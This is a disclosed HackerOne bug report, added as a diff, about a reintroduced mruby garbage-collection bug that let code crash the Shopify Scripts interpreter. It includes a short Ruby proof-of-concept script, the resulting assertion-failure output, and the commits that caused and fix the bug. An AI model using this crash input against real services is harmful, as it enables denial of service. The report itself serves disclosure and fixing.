@@ -1,0 +1,34 @@
+ReportLink:https://hackerone.com/reports/215854
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/dgaletic
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:300.0
+Severity:low
+State:Closed
+DateOfDisclosure:15.04.2017 14:45:02
+
+Summary:
+
+This github [issue](https://github.com/mruby/mruby/issues/3063] seems to have been reintroduced.
+
+    f = Fiber.new do
+        m = Fiber.current
+        Fiber.yield Proc.new {}
+    end
+
+    f = f.resume
+    GC.start
+    
+It causes mruby to abort due to a failed assertion.    
+    
+    $ mruby poc
+    mruby: /home/user/repos/mruby/src/gc.c:698: mrb_gc_mark: Assertion `(obj)->tt != MRB_TT_FREE' failed.
+    Aborted
+
+The issue was reintroduced in ecee8c51b0ad8cddd9e422a3e5105f902d7e2781 and is still present in 051e40c0493f2de332f5439e3230c9fe6958bf1a.
+
+The issue is fixed by reverting ecee8c51b0ad8cddd9e422a3e5105f902d7e2781.
+
+Thank you,
+Dinko Galetic
+Denis Kasak
